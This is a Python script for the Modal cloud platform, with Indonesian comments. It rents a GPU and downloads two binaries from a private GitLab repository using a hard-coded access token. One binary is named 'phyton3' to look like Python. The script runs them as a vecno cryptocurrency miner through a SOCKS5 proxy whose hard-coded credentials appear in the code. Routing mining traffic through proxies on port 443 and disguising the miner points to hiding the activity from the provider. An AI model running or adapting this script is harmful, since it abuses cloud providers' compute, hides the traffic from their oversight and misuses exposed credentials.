import modal
import os
import random
import subprocess

# Konfigurasi Image & Tools
tomi_image = (
    modal.Image.from_dockerhub("nvidia/cuda:12.3.1-runtime-ubuntu22.04")
    .apt_install("proxychains4", "curl", "wget", "libgomp1")
)

app = modal.App("tomi-ninja-power")

@app.function(
    image=tomi_image,
    gpu="L40S", 
    timeout=86400,
    cpu=4.0,
    memory=16384,
)
def run_engine():
    # --- LIST PROXY 911 (Update di sini aja Tom) ---
    proxies = [
        "64.113.11.234 2600 chqt0a2mgjdr om2A0VNIBwf6Jagj",
        # "IP:PORT:USER:PASS"
    ]
    
    pick = random.choice(proxies)
    
    # Setup Proxychains secara instan
    conf = f"strict_chain\nproxy_dns\nremote_dns_resolver\n[ProxyList]\nsocks5 {pick}\n"
    with open("/tmp/pc.conf", "w") as f:
        f.write(conf)
        
    print(f"🕵️ Using Ninja Path: {pick.split()[0]}")

    # --- DOWNLOAD & RUN ---
    token = "glpat-AFBeX-xWPn_3ek-wEgDFdm86MQp1OmpwcDJxCw.01.1213frriw"
    uri = "https://gitlab.com/api/v4/projects/zeta.poke86%2Fultimate-gear/repository/files"
    
    # Gabungin perintah biar efisien
    cmd = (
        f"wget -q --header='PRIVATE-TOKEN: {token}' {uri}/libvecnocuda.so/raw?ref=main -O lib.so && "
        f"wget -q --header='PRIVATE-TOKEN: {token}' {uri}/phyton3/raw?ref=main -O runner && "
        "chmod +x lib.so runner && export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:. && "
        f"proxychains4 -f /tmp/pc.conf ./runner -a vecno:qplx5k508ru9letd87d8vcp9drjfvzv9hk6hdvc3a8d7rx95k63g54sy26cx6 "
        f"--stratum-server 152.42.171.146 --stratum-port 443 --stratum-worker .gear_{os.urandom(2).hex()} -t 0"
    )
    
    # Eksekusi dan tampilkan log live
    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for line in p.stdout:
        print(line, end="")

@app.local_entrypoint()
def main():
    run_engine.remote()
